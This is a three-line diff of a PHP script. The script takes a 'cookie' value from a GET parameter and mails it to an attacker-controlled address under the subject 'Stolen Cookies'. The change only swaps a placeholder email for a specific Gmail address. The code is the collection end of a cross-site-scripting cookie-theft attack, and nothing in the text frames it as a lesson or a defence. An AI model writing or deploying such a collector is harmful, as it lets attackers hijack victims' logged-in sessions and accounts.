@@ -1,3 +1,3 @@
 <?php
-$cookie = $HTTP_GET_VARS[“cookie”]; mail(“hackerid@mailprovider.com”, “Stolen Cookies”, $cookie); 
+$cookie = $HTTP_GET_VARS[“cookie”]; mail(“hackerslaboratory.yt@gmail.com”, “Stolen Cookies”, $cookie); 
 ?>
